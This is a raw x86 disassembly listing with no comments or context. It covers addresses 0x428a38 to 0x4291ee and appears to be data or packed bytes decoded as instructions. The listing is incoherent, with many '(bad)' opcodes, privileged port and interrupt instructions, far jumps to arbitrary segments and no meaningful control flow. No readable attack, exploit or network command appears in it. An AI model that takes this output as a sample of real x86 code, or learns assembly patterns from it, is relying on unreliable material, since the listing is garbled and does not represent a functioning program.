  428a38:	mov    DWORD PTR gs:[edx+ebx*2-0x1b],ecx
  428a3d:	call   0x4b2c525f
  428a42:	push   ss
  428a43:	mov    dh,al
  428a45:	fld    st(1)
  428a47:	lods   al,BYTE PTR ds:[esi]
  428a48:	popa   
  428a49:	jbe    0x428a35
  428a4b:	mov    eax,ds:0x222d9b98
  428a50:	popf   
  428a51:	xchg   edx,eax
  428a52:	add    DWORD PTR [ebx],ecx
  428a54:	pushf  
  428a55:	adc    al,bl
  428a57:	push   0x12
  428a59:	add    dl,ch
  428a5b:	test   BYTE PTR [ecx+0x4f],al
  428a5e:	cs inc ebx
  428a60:	mov    al,ah
  428a62:	enter  0xf823,0x31
  428a66:	inc    edx
  428a67:	sbb    BYTE PTR [ecx-0x14],ah
  428a6a:	push   edi
  428a6b:	jo     0x428a55
  428a6d:	xchg   ebx,eax
  428a6e:	jg     0x428a8d
  428a70:	cmp    esi,edi
  428a72:	pop    esp
  428a73:	xor    ebp,0x23
  428a76:	sub    ebp,DWORD PTR [eax+0x3bbb0aea]
  428a7c:	push   ebx
  428a7d:	les    edx,FWORD PTR [edx+0x35]
  428a80:	addr16 loope 0x428a86
  428a83:	cmp    ebp,ecx
  428a85:	cmp    edi,esi
  428a87:	mov    bh,BYTE PTR [ebx+0x3f]
  428a8a:	cmp    al,0x34
  428a8c:	adc    eax,0x68fbb1e0
  428a91:	cwde   
  428a92:	dec    edx
  428a93:	jmp    0x428a56
  428a95:	push   ecx
  428a96:	pop    eax
  428a97:	pop    eax
  428a98:	sbb    BYTE PTR es:[ebx+ebx*8],bl
  428a9c:	into   
  428a9d:	dec    ecx
  428a9e:	icebp  
  428a9f:	mov    ds:0x5d87fbd0,al
  428aa4:	jge    0x428b25
  428aa6:	in     eax,0xe1
  428aa8:	pop    ecx
  428aa9:	inc    edi
  428aaa:	js     0x428a3f
  428aac:	jecxz  0x428b2b
  428aae:	xor    al,0xe4
  428ab0:	xchg   edx,eax
  428ab1:	add    eax,0xb7984db1
  428ab6:	adc    DWORD PTR [ebp+0x1b],ebp
  428ab9:	ins    DWORD PTR es:[edi],dx
  428aba:	dec    edx
  428abb:	adc    al,0x90
  428abd:	push   cx
  428abf:	mov    eax,0xeaf9af0e
  428ac4:	out    dx,eax
  428ac5:	jnp    0x428a88
  428ac7:	iret   
  428ac8:	std    
  428ac9:	ret    0x9e4b
  428acc:	jne    0x428adf
  428ace:	sti    
  428acf:	repz ds (bad) 
  428ad3:	fs push eax
  428ad5:	add    al,0x4f
  428ad7:	dec    edx
  428ad8:	add    eax,0x835df400
  428add:	pop    edi
  428ade:	push   DWORD PTR [edi]
  428ae0:	jg     0x428ad0
  428ae2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  428ae4:	int    0xf4
  428ae6:	pop    edi
  428ae7:	cmp    BYTE PTR [edi+0x51],bl
  428aea:	or     BYTE PTR [esi+ebp*1+0x4],cl
  428aee:	mov    eax,0xaf6ae1e0
  428af3:	pop    ss
  428af4:	and    al,0xa
  428af6:	and    al,0x46
  428af8:	les    esi,FWORD PTR [esi]
  428afa:	jne    0x428b61
  428afc:	lods   eax,DWORD PTR ds:[esi]
  428afd:	cmp    bh,BYTE PTR [edx-0x76]
  428b00:	and    BYTE PTR [esi+eax*2],ch
  428b03:	hlt    
  428b04:	inc    ecx
  428b05:	push   ss
  428b06:	xlat   BYTE PTR ds:[ebx]
  428b07:	push   edx
  428b08:	pop    ss
  428b09:	cmp    al,BYTE PTR [ebx]
  428b0b:	add    BYTE PTR [ecx+0x775ce862],bl
  428b11:	jae    0x428ab2
  428b13:	popf   
  428b14:	rcl    DWORD PTR [edx-0x2f],cl
  428b17:	push   0xffffffe4
  428b19:	nop
  428b1a:	ret    
  428b1b:	sbb    al,0x33
  428b1d:	ja     0x428b28
  428b1f:	repz imul ebx,DWORD PTR [esi],0xffffffc6
  428b23:	div    BYTE PTR [ebp-0x61]
  428b26:	inc    edx
  428b27:	je     0x428ba4
  428b29:	pop    edx
  428b2a:	inc    edx
  428b2b:	sub    ecx,edx
  428b2d:	fbld   TBYTE PTR [edi]
  428b2f:	repz push 0x5f2b08a1
  428b35:	pusha  
  428b36:	sub    edi,DWORD PTR [ebp+0x7bf92852]
  428b3c:	mov    al,ds:0x94e7bfcb
  428b41:	or     al,0x2f
  428b43:	push   es
  428b44:	cmp    ch,BYTE PTR [edx+0x5a]
  428b47:	push   edx
  428b48:	das    
  428b49:	(bad)  
  428b4a:	call   0x1065:0x3b9190f8
  428b51:	push   ebx
  428b52:	inc    esp
  428b53:	dec    edx
  428b54:	or     eax,0x4e641a12
  428b59:	jmp    0xe040:0x5103b34e
  428b60:	sbb    dl,BYTE PTR [ecx+eax*1-0x692c5f5a]
  428b67:	jae    0x428aed
  428b69:	add    al,0xc5
  428b6b:	or     ah,al
  428b6d:	add    edx,esp
  428b6f:	mov    dl,0x16
  428b71:	mov    dl,0x34
  428b73:	add    al,ah
  428b75:	mov    ch,0xa1
  428b77:	mov    dh,BYTE PTR ds:0xbea5878e
  428b7d:	add    al,0x0
  428b7f:	addr16 pop ebp
  428b81:	aad    0xec
  428b83:	fst    DWORD PTR [eax-0x4]
  428b86:	fcom   QWORD PTR [ebx-0x77]
  428b89:	cmp    DWORD PTR [eax-0x8],ebp
  428b8c:	loope  0x428b22
  428b8e:	mov    DWORD PTR [eax],ebx
  428b90:	add    al,0xf3
  428b92:	scas   al,BYTE PTR es:[edi]
  428b93:	mov    al,ds:0x48d75960
  428b98:	xchg   ebx,eax
  428b99:	or     eax,0x9d73d006
  428b9e:	sbb    al,0x34
  428ba0:	fadd   QWORD PTR [ecx]
  428ba2:	and    DWORD PTR [ebx],esi
  428ba4:	or     eax,0x1ea02021
  428baa:	lods   eax,DWORD PTR ds:[esi]
  428bab:	mov    ds:0x3b306372,al
  428bb0:	lods   al,BYTE PTR ds:[esi]
  428bb1:	fdivp  st(7),st
  428bb3:	aad    0x68
  428bb5:	out    dx,eax
  428bb6:	jp     0x428bde
  428bb8:	jmp    0xd8c6:0x87ab04d1
  428bbf:	fistp  DWORD PTR [esi+0x602269a1]
  428bc5:	dec    ebp
  428bc6:	cmp    al,ah
  428bc8:	sub    bl,0x4
  428bcb:	pop    edi
  428bcc:	ret    
  428bcd:	sbb    dh,0xe0
  428bd0:	not    DWORD PTR [edx+0x1afca438]
  428bd6:	sbb    BYTE PTR [edx-0x65],bl
  428bd9:	xlat   BYTE PTR ds:[ebx]
  428bda:	push   edi
  428bdb:	jbe    0x428c1f
  428bdd:	xchg   esp,esi
  428bdf:	idiv   ebx
  428be1:	sbb    BYTE PTR [esi-0xaf673cd],cl
  428be7:	cmp    dl,0xb3
  428bea:	stos   DWORD PTR es:[edi],eax
  428beb:	and    al,0x9d
  428bee:	sar    DWORD PTR [edi+0x73],1
  428bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428bf2:	xor    al,0x4a
  428bf4:	arpl   WORD PTR [edx-0x74],dx
  428bf7:	adc    DWORD PTR [ebp-0x65],ebp
  428bfa:	adc    bh,ah
  428bfc:	sub    eax,0x2d50d662
  428c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c02:	sub    al,0x71
  428c04:	push   ss
  428c05:	fcomip st,st(4)
  428c07:	fdivr  QWORD PTR [edi-0xc]
  428c0a:	ret    0xf3ff
  428c0d:	idiv   DWORD PTR [edi-0xc]
  428c10:	pop    es
  428c11:	dec    edi
  428c12:	lahf   
  428c13:	cld    
  428c14:	loopne 0x428bb5
  428c16:	push   cs
  428c17:	adc    edi,DWORD PTR [edi-0xfbac5b1]
  428c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c1e:	enter  0x2c02,0xdb
  428c22:	lods   al,BYTE PTR ds:[esi]
  428c23:	dec    eax
  428c24:	test   al,0xf9
  428c26:	icebp  
  428c27:	pop    ds
  428c28:	std    
  428c29:	(bad)  
  428c2a:	(bad)  
  428c2b:	fcmovnb st,st(1)
  428c2d:	mov    edi,0x4e493103
  428c32:	pop    edx
  428c33:	clc    
  428c34:	and    ah,BYTE PTR [esi-0x7]
  428c37:	xchg   ecx,eax
  428c38:	xchg   edx,eax
  428c39:	into   
  428c3a:	push   0x39570c0b
  428c3f:	cmp    bh,ah
  428c41:	mov    ebx,0x52cb6d7a
  428c46:	jne    0x428c2b
  428c48:	pushf  
  428c49:	mov    bl,0xd
  428c4b:	or     BYTE PTR [ecx],bl
  428c4d:	(bad)  
  428c4e:	retf   0x920b
  428c51:	frstor [esp+eax*1+0x31ac3ac6]
  428c58:	imul   eax,DWORD PTR [esi+0x20],0x10e1935
  428c5f:	inc    ecx
  428c60:	(bad)  
  428c61:	lock mov ebx,0x6b661187
  428c67:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c69:	lahf   
  428c6a:	jecxz  0x428c04
  428c6c:	shl    BYTE PTR [ebx],0x2
  428c6f:	xlat   BYTE PTR ds:[ebx]
  428c70:	push   cs
  428c71:	mov    esp,0x2abc0ea
  428c76:	aaa    
  428c77:	jno    0x428c59
  428c79:	call   0x8195:0x802e5d0c
  428c80:	pop    eax
  428c81:	mov    BYTE PTR [edi],0xaf
  428c84:	test   eax,0x774dcb32
  428c89:	test   DWORD PTR [esi],ebp
  428c8b:	fdivr  QWORD PTR ds:0x7aa491d7
  428c91:	pop    eax
  428c93:	adc    eax,0x718c6146
  428c98:	mov    ebp,0xc75fb18a
  428c9d:	cwde   
  428c9e:	push   edi
  428c9f:	push   ecx
  428ca0:	sti    
  428ca1:	or     cl,BYTE PTR [esi-0x3b7319ff]
  428ca7:	sub    eax,0x43919572
  428cac:	test   BYTE PTR [edi+0x4d1ea02],ch
  428cb2:	sar    DWORD PTR [ecx+0x4d],0xcd
  428cb6:	and    eax,0x32a82501
  428cbb:	xor    cl,BYTE PTR [edx+0x32]
  428cbe:	and    BYTE PTR [esi+0x2ee724f5],0x5b
  428cc5:	ret    0x5d9a
  428cc8:	aam    0x93
  428cca:	in     eax,0xa0
  428ccc:	cld    
  428ccd:	add    eax,0x19192e16
  428cd2:	ds or  dl,cl
  428cd5:	pop    ds
  428cd6:	mov    al,ds:0xf10245c5
  428cdb:	push   ss
  428cdc:	fidivr DWORD PTR [eax+0x5641a242]
  428ce2:	jg     0x428d29
  428ce4:	push   eax
  428ce5:	push   es
  428ce6:	bound  edi,QWORD PTR [ebp+0xf]
  428ce9:	add    DWORD PTR [eax-0x14],0x38c6a811
  428cf0:	lods   al,BYTE PTR ds:[esi]
  428cf1:	bound  ebx,QWORD PTR [edi+ebx*1+0x46]
  428cf5:	in     eax,dx
  428cf6:	es and bh,ch
  428cf9:	xor    BYTE PTR [esi-0x8],bh
  428cfc:	sub    edx,DWORD PTR [eax]
  428cfe:	out    dx,eax
  428cff:	mov    esi,0x8c68d511
  428d04:	xchg   ebp,eax
  428d05:	cmc    
  428d06:	adc    DWORD PTR [edx+0x19ca4479],ebx
  428d0c:	into   
  428d0d:	xor    DWORD PTR [edx],ebp
  428d0f:	jecxz  0x428d23
  428d11:	shr    BYTE PTR [edx],1
  428d13:	cmp    esp,DWORD PTR [ebx-0x18518874]
  428d19:	call   0x6f91b311
  428d1e:	pusha  
  428d1f:	mov    al,ds:0x2e78e3eb
  428d24:	and    esp,edi
  428d26:	mov    ah,BYTE PTR [edx+0x32]
  428d29:	shr    BYTE PTR [edi-0xeac966c],0x22
  428d30:	mov    edx,0xc0fbf5f7
  428d35:	mov    dl,0x39
  428d37:	cmp    BYTE PTR ds:[ebx+eiz*8+0xa],dl
  428d3c:	mov    eax,ds:0x9507ecd6
  428d41:	ins    BYTE PTR es:[edi],dx
  428d42:	dec    ebp
  428d43:	imul   eax,DWORD PTR [ecx+0x27],0x7575ca32
  428d4a:	std    
  428d4b:	mov    bl,0xa0
  428d4d:	adc    al,0x2d
  428d4f:	dec    ecx
  428d50:	mov    bl,0xd3
  428d52:	cld    
  428d53:	leave  
  428d54:	rcr    DWORD PTR [esi-0x2],cl
  428d57:	hlt    
  428d58:	push   DWORD PTR [eax-0x39]
  428d5b:	das    
  428d5c:	dec    ah
  428d5e:	mov    ecx,0x53fc1f93
  428d63:	mov    al,ds:0xf9f649f7
  428d68:	daa    
  428d69:	ret    
  428d6a:	in     eax,dx
  428d6b:	les    ecx,FWORD PTR [ecx-0x118770ed]
  428d71:	icebp  
  428d72:	ficomp DWORD PTR [esi-0x48bfe774]
  428d78:	ins    DWORD PTR es:[edi],dx
  428d79:	ins    BYTE PTR es:[edi],dx
  428d7a:	ins    BYTE PTR es:[edi],dx
  428d7b:	in     al,0x6f
  428d7d:	(bad)  
  428d7e:	fld    TBYTE PTR [edi]
  428d80:	fdivr  QWORD PTR [ecx-0x2c510d]
  428d86:	in     al,dx
  428d87:	sub    eax,0x86edbf6f
  428d8c:	fsub   DWORD PTR [edi+edx*1-0x7ddd3c00]
  428d93:	retf   0x1211
  428d96:	les    ecx,FWORD PTR [eax+0x982941c]
  428d9c:	xchg   esi,eax
  428d9d:	arpl   si,cx
  428d9f:	cmp    DWORD PTR [edx+0x2b9a5b20],ebp
  428da5:	adc    eax,0xdd20b000
  428daa:	in     eax,0x32
  428dac:	pop    eax
  428dad:	fild   QWORD PTR [ecx+ebx*1+0x19]
  428db1:	push   ebp
  428db2:	mov    ds:0x11fb0368,al
  428db7:	xor    eax,DWORD PTR [ecx+0x6aab865a]
  428dbd:	pusha  
  428dbe:	outs   dx,DWORD PTR ds:[esi]
  428dbf:	sub    BYTE PTR [edx-0x11],0x18
  428dc3:	fs cmp al,0x47
  428dc6:	or     dl,BYTE PTR [ebx+0x30]
  428dc9:	or     cl,cl
  428dcb:	mov    ch,0x90
  428dcd:	dec    edx
  428dce:	mov    ebp,0x7231001
  428dd3:	lea    ebx,[ecx]
  428dd5:	lds    eax,FWORD PTR [ecx]
  428dd7:	jns    0x428e37
  428dd9:	mov    ah,0x8f
  428ddb:	popa   
  428ddc:	add    DWORD PTR [ecx-0x20],edi
  428ddf:	inc    edx
  428de0:	mov    cl,BYTE PTR [esi]
  428de2:	add    eax,0x988f4ced
  428de7:	in     eax,0x74
  428de9:	push   cs
  428dea:	leave  
  428deb:	mov    ch,0x26
  428ded:	nop
  428dee:	or     bh,BYTE PTR [eax+0x49]
  428df1:	into   
  428df2:	pusha  
  428df3:	or     DWORD PTR [edx+0x3c11e413],ecx
  428df9:	int    0xd5
  428dfb:	adc    esp,eax
  428dfd:	push   0xbb209b00
  428e02:	add    al,0xa9
  428e04:	add    eax,0x1e0e011e
  428e09:	scas   al,BYTE PTR es:[edi]
  428e0a:	jno    0x428e2c
  428e0c:	imul   esi,DWORD PTR [ebp+eax*1+0x289b5918],0x568518a1
  428e17:	hlt    
  428e18:	jns    0x428e65
  428e1a:	test   DWORD PTR [ecx+0x1cc2e696],ecx
  428e20:	xor    WORD PTR [edx+0x3],0xdb64
  428e26:	lahf   
  428e27:	mov    dl,0xe
  428e29:	jo     0x428e38
  428e2b:	aam    0x55
  428e2d:	adc    eax,0xfbeeb892
  428e32:	test   eax,0xc5ab455
  428e37:	fwait
  428e38:	pop    esp
  428e39:	les    ebx,FWORD PTR [esi-0x31]
  428e3c:	scas   eax,DWORD PTR es:[edi]
  428e3d:	daa    
  428e3e:	pcmpeqd mm2,QWORD PTR ds:0xc3a80fbc
  428e45:	mov    bh,BYTE PTR [edx+0x5b]
  428e48:	mov    ss,WORD PTR [ecx-0xf84a7e0]
  428e4e:	sub    eax,DWORD PTR [ecx+0x77]
  428e51:	ds pop ss
  428e53:	fimul  WORD PTR [edi+0x26876b0]
  428e59:	mov    BYTE PTR [eax],ah
  428e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e5c:	mov    eax,fs
  428e5e:	jge    0x428eb7
  428e60:	push   ecx
  428e61:	pop    ecx
  428e62:	add    BYTE PTR [ebx+0x29],dl
  428e65:	pusha  
  428e66:	imul   ecx,DWORD PTR [ecx-0x1cd7f62b],0xffffffc6
  428e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e6e:	js     0x428e74
  428e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e71:	aam    0x7b
  428e73:	outs   dx,DWORD PTR ds:[esi]
  428e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e75:	inc    eax
  428e76:	mov    esi,0xba740bfb
  428e7b:	ins    DWORD PTR es:[edi],dx
  428e7c:	rcl    DWORD PTR [ebx+0x28],0x6b
  428e80:	or     DWORD PTR [ebp-0x7],0x260fce56
  428e87:	add    BYTE PTR [ecx+0x28],ch
  428e8a:	and    ebp,edi
  428e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e8d:	inc    edx
  428e8e:	dec    edx
  428e8f:	or     DWORD PTR [ebp+0x52],ebp
  428e92:	rcr    BYTE PTR [eax+0x669c400c],cl
  428e98:	push   ecx
  428e99:	imul   BYTE PTR [esi]
  428e9b:	in     al,dx
  428e9c:	fdiv   QWORD PTR [ebp-0x33]
  428e9f:	xlat   BYTE PTR ds:[ebx]
  428ea0:	popf   
  428ea1:	clc    
  428ea2:	jmp    0xb63c4e36
  428ea7:	lahf   
  428ea8:	dec    BYTE PTR [ebx+0x5fa1bf37]
  428eae:	push   edx
  428eaf:	call   0xb89cd010
  428eb4:	das    
  428eb5:	scas   eax,DWORD PTR es:[edi]
  428eb6:	jne    0x428f02
  428eb8:	loopne 0x428eab
  428eba:	test   BYTE PTR [esi],0x9e
  428ebd:	aam    0xa
  428ebf:	shl    BYTE PTR [esi-0x15001c04],0x95
  428ec6:	addr16 dec edi
  428ec8:	outs   dx,DWORD PTR ds:[esi]
  428ec9:	ins    BYTE PTR es:[edi],dx
  428eca:	jge    0x428ecb
  428ecc:	(bad)  
  428ecd:	clc    
  428ece:	rcr    ch,1
  428ed0:	mov    bh,0xc6
  428ed2:	es pop esi
  428ed4:	pop    ss
  428ed5:	push   0xffffffe2
  428ed7:	fsub   DWORD PTR [eax+esi*4]
  428eda:	pop    ebp
  428edb:	js     0x428ec4
  428edd:	jne    0x428eb1
  428edf:	mov    al,0x1f
  428ee1:	adc    DWORD PTR [edx+0x43],esi
  428ee4:	mov    BYTE PTR [ecx+0x27],dl
  428ee7:	loop   0x428e69
  428ee9:	sbb    BYTE PTR [ecx],bh
  428eeb:	cmc    
  428eec:	jecxz  0x428e9c
  428eee:	xor    al,0xe8
  428ef0:	into   
  428ef1:	pop    ebp
  428ef2:	mov    al,ss:0xd16d0b8b
  428ef8:	mov    al,fs:0xac97e9ab
  428efe:	add    esi,DWORD PTR [esp+ebx*4]
  428f01:	xchg   ecx,eax
  428f02:	push   0xf9057684
  428f07:	mov    eax,ds:0x8239911b
  428f0c:	(bad)  
  428f0d:	das    
  428f0e:	and    dl,ch
  428f10:	jnp    0x428f12
  428f12:	or     DWORD PTR [edx+0x245c0457],esi
  428f18:	add    cl,BYTE PTR [esi-0x70]
  428f1b:	int    0xb2
  428f1d:	cmp    bh,ch
  428f1f:	xchg   esp,eax
  428f20:	imul   DWORD PTR [ebp+0x49ac635]
  428f26:	inc    ebx
  428f27:	xchg   DWORD PTR ds:0x5d802ac4,eax
  428f2d:	fistp  QWORD PTR [esi-0x4ced7047]
  428f33:	jp     0x428f66
  428f35:	inc    esp
  428f36:	or     ch,dh
  428f38:	gs in  eax,dx
  428f3a:	pop    ebp
  428f3b:	add    BYTE PTR [ecx-0x53],al
  428f3e:	push   ds
  428f3f:	add    al,0x4e
  428f41:	inc    esi
  428f42:	or     cl,al
  428f44:	mov    ecx,0x85a9c84
  428f49:	jmp    0x247593b0
  428f4e:	daa    
  428f4f:	pop    ebp
  428f50:	hlt    
  428f51:	inc    ecx
  428f52:	adc    BYTE PTR [eax-0x7d],dl
  428f55:	xchg   ebx,eax
  428f56:	inc    ebx
  428f57:	xchg   edx,eax
  428f58:	push   0x4735a7a3
  428f5d:	das    
  428f5e:	scas   al,BYTE PTR es:[edi]
  428f5f:	mov    dl,0xaa
  428f61:	(bad)  
  428f62:	mov    ds:0x644bec80,al
  428f67:	and    BYTE PTR [ebp-0x414bd186],dh
  428f6d:	and    bl,BYTE PTR [ebx-0x3f61e530]
  428f73:	mov    ds:0x8e76c7ac,al
  428f78:	inc    eax
  428f79:	add    al,BYTE PTR [edx+eax*1-0x44]
  428f7d:	xor    eax,0x3303b147
  428f82:	ret    
  428f83:	mov    ebx,0x5559c0a0
  428f88:	and    eax,DWORD PTR [ecx+edx*4+0x491e7701]
  428f8f:	adc    cl,BYTE PTR [esi-0x55ef134]
  428f95:	aam    0xd7
  428f97:	bound  esi,QWORD PTR [esi-0x1a]
  428f9a:	adc    BYTE PTR [edx-0x3c4a7b96],ch
  428fa0:	adc    edx,DWORD PTR [eax]
  428fa2:	sub    cl,0xb4
  428fa5:	mov    ch,0x16
  428fa7:	fiadd  DWORD PTR [edx]
  428fa9:	inc    esp
  428faa:	push   edx
  428fab:	leave  
  428fac:	cmp    bl,BYTE PTR [edx+0x5c]
  428faf:	scas   eax,DWORD PTR es:[edi]
  428fb0:	mov    edi,0xb037abbd
  428fb5:	mov    edx,0x4bf18d7a
  428fba:	fistp  QWORD PTR [edi-0xcfd31a3]
  428fc0:	jbe    0x428fba
  428fc2:	add    BYTE PTR [edx],bh
  428fc4:	mov    WORD PTR [edi+edx*4-0x281fd146],?
  428fcb:	dec    ebp
  428fcc:	add    BYTE PTR [esi-0xc2b61e8],ch
  428fd2:	repnz test DWORD PTR [ebp+0x6803fa89],ecx
  428fd9:	mov    ebp,0x36fb2a84
  428fde:	mov    ebx,DWORD PTR [edx+0x7f]
  428fe1:	mov    cl,0xd6
  428fe3:	je     0x429007
  428fe5:	in     al,dx
  428fe6:	pushf  
  428fe7:	fstp   TBYTE PTR [ecx-0x8]
  428fea:	fcomp  DWORD PTR [edi+0x3b]
  428fed:	neg    BYTE PTR [edi]
  428fef:	push   ds
  428ff0:	cli    
  428ff1:	shr    bh,1
  428ff3:	jle    0x428fe1
  428ff5:	das    
  428ff6:	fdivp  st(4),st
  428ff8:	xchg   BYTE PTR [esp+edx*4],cl
  428ffb:	jbe    0x428fcc
  428ffd:	inc    edi
  428ffe:	fadd   QWORD PTR [esi-0x3647403e]
  429004:	jecxz  0x428fb3
  429006:	or     BYTE PTR [esi+0x70c018b4],bl
  42900c:	xor    edi,DWORD PTR [eax+eax*8]
  42900f:	jmp    FWORD PTR [edi]
  429011:	jmp    esp
  429013:	aaa    
  429014:	pop    esi
  429015:	clc    
  429016:	icebp  
  429017:	(bad)  
  429018:	jg     0x429010
  42901a:	fnstsw WORD PTR [edx+ecx*1]
  42901d:	xchg   DWORD PTR [eax+esi*2-0x14],edi
  429021:	jge    0x429028
  429023:	push   edi
  429024:	stos   DWORD PTR es:[edi],eax
  429025:	mov    edx,DWORD PTR [esi]
  429027:	adc    BYTE PTR [esi+0x4f944308],0xb0
  42902e:	ins    DWORD PTR es:[edi],dx
  42902f:	and    dh,BYTE PTR [edx+0x4a]
  429032:	ss sbb bl,al
  429035:	sub    dh,ch
  429037:	shr    BYTE PTR [edi],1
  429039:	xchg   esi,eax
  42903a:	ret    0xaade
  42903d:	cmp    al,0x22
  42903f:	mov    ebp,0x265528e5
  429044:	jmp    0x5a31:0xed421211
  42904b:	or     eax,ecx
  42904d:	dec    eax
  42904e:	fmul   DWORD PTR [ebx+0x1ed5c83b]
  429054:	rcl    cl,cl
  429056:	repz push 0x5a449c4f
  42905c:	fld    QWORD PTR [esi-0xe]
  42905f:	jnp    0x4290a9
  429061:	aad    0x1c
  429063:	cdq    
  429064:	pop    ebx
  429065:	sub    eax,DWORD PTR [edx-0x6f371bef]
  42906b:	sub    DWORD PTR [eax-0x46ec8547],eax
  429071:	dec    ecx
  429072:	sar    BYTE PTR [esp+esi*8],0xe0
  429076:	ret    
  429077:	add    BYTE PTR [esi+0xf1d26ee],ch
  42907d:	jg     0x42902f
  42907f:	sub    eax,0x23aca158
  429084:	enter  0x411c,0xf3
  429088:	cld    
  429089:	out    0x86,al
  42908b:	adc    esi,DWORD PTR [edi-0x1f]
  42908e:	dec    esp
  42908f:	(bad)  
  429090:	add    DWORD PTR [eax],eax
  429092:	cli    
  429093:	mov    edx,0x420e4030
  429098:	fidiv  WORD PTR ss:[ebx]
  42909b:	add    DWORD PTR [ebp+ebx*1-0x737e4ed8],edx
  4290a2:	lods   al,BYTE PTR ds:[esi]
  4290a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290a5:	pop    esi
  4290a6:	fucomp st(0)
  4290a8:	test   BYTE PTR [esi],al
  4290aa:	test   eax,0x72d2f035
  4290af:	jmp    edx
  4290b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290b2:	pop    ss
  4290b3:	cmp    dl,BYTE PTR [ebx]
  4290b5:	jle    0x429065
  4290b7:	xchg   esp,eax
  4290b8:	sub    BYTE PTR [ebx],dl
  4290ba:	add    al,0x90
  4290bc:	int    0x1a
  4290be:	hlt    
  4290bf:	push   edx
  4290c0:	jmp    0x42320c71
  4290c5:	mov    eax,esp
  4290c7:	dec    eax
  4290c8:	mov    ecx,0xa00f9d1d
  4290cd:	retf   0xb15b
  4290d0:	push   ecx
  4290d1:	push   es
  4290d2:	xchg   edx,eax
  4290d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290d4:	cmp    BYTE PTR [edi+0x4875f3de],cl
  4290da:	minps  xmm0,XMMWORD PTR [edi]
  4290dd:	in     al,0x1a
  4290df:	stos   DWORD PTR es:[edi],eax
  4290e0:	imul   ebp,DWORD PTR [ebx+0x72024d18],0x16
  4290e7:	dec    esp
  4290e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290e9:	inc    esi
  4290ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290eb:	push   edx
  4290ec:	mov    bh,BYTE PTR [ebx+0x30]
  4290ef:	mov    al,0xf6
  4290f1:	and    eax,0xb9a1dabd
  4290f6:	sti    
  4290f7:	push   ebx
  4290f8:	mov    eax,0xc882df65
  4290fd:	ja     0x429104
  4290ff:	inc    ebx
  429100:	and    eax,0xc7eab7de
  429105:	fidivr WORD PTR [ebp-0x1698884d]
  42910b:	xor    al,0x84
  42910d:	jmp    0x7866:0x7a274d13
  429114:	outs   dx,DWORD PTR ds:[esi]
  429115:	clc    
  429116:	inc    esi
  429117:	pop    edi
  429118:	je     0x42917a
  42911a:	sbb    BYTE PTR [edi+0x51b5f576],cl
  429120:	retf   
  429121:	mov    ds:0x4ee7ee63,al
  429126:	ins    BYTE PTR es:[edi],dx
  429127:	lahf   
  429128:	fidivr WORD PTR [esp+esi*2-0xf15408]
  42912f:	fisttp DWORD PTR [ebx+0x6de7bf77]
  429135:	pop    ds
  429136:	cld    
  429137:	mov    ch,0xff
  429139:	mov    esp,0x9f82e585
  42913e:	pop    ss
  42913f:	inc    bh
  429141:	xchg   edx,eax
  429142:	mov    ebx,0x945c7fb
  429148:	jl     0x429193
  42914a:	sub    BYTE PTR [eax],al
  42914c:	mov    al,ds:0xfddf0257
  429151:	jge    0x429112
  429153:	repnz lea ebx,[edi-0x24393307]
  42915a:	std    
  42915b:	cmp    BYTE PTR [esp+ebx*4+0x77],cl
  42915f:	in     al,0x43
  429161:	add    BYTE PTR [edi-0x66],dl
  429164:	mov    ds:0xa219cae1,al
  429169:	ins    DWORD PTR es:[edi],dx
  42916a:	ins    DWORD PTR es:[edi],dx
  42916b:	cwde   
  42916c:	dec    ebp
  42916d:	xor    al,0x36
  42916f:	(bad)  
  429171:	adc    edx,DWORD PTR [eax+0x3540fe7b]
  429177:	and    bh,bl
  429179:	out    0xc,eax
  42917b:	pop    eax
  42917c:	mov    esp,0x4893e45b
  429181:	jecxz  0x4291fc
  429183:	pop    ds
  429184:	sbb    al,0x26
  429186:	stos   DWORD PTR es:[edi],eax
  429187:	add    DWORD PTR [edx],esp
  429189:	and    BYTE PTR [esi],0xcf
  42918c:	shl    al,1
  42918e:	push   cs
  42918f:	loop   0x42917b
  429191:	(bad)
  429196:	push   edi
  429197:	popf   
  429198:	inc    ebp
  429199:	pop    edx
  42919a:	fld    DWORD PTR [edx+0xc]
  42919d:	pop    ebx
  42919e:	enter  0xe61,0x22
  4291a2:	int    0x40
  4291a4:	in     al,0x44
  4291a6:	dec    eax
  4291a7:	xor    eax,DWORD PTR [ecx]
  4291a9:	out    0xac,al
  4291ab:	cmp    DWORD PTR [esi],0x1a
  4291ae:	inc    eax
  4291af:	pushw  ss
  4291b1:	xchg   al,al
  4291b3:	add    BYTE PTR [ecx+0x5b],cl
  4291b6:	pop    esp
  4291b7:	test   DWORD PTR [ebx+0x0],ebp
  4291ba:	inc    eax
  4291bb:	xchg   DWORD PTR [ebp-0x18],eax
  4291be:	test   BYTE PTR [ecx-0x73],ah
  4291c1:	mov    cl,0x85
  4291c3:	push   ebp
  4291c4:	clc    
  4291c5:	lds    eax,FWORD PTR [eax]
  4291c7:	inc    ebx
  4291c8:	lea    esp,[esi+0x4c]
  4291cb:	jno    0x4291b1
  4291cd:	fcomp  QWORD PTR [ecx-0x3d]
  4291d0:	in     al,0x1a
  4291d2:	nop
  4291d3:	mov    bh,0xdf
  4291d5:	call   0xe836:0x942a9418
  4291dc:	push   edx
  4291dd:	ss int3 
  4291df:	rcr    cl,1
  4291e1:	add    esp,eax
  4291e3:	mov    WORD PTR [esp+esi*4+0x8e73d5f],ds
  4291ea:	cmp    BYTE PTR [edx+0x22],al
  4291ed:	dec    ebx
  4291ee:	test   DWORD PTR [ecx+0x3cf5525a],0x70d75c04
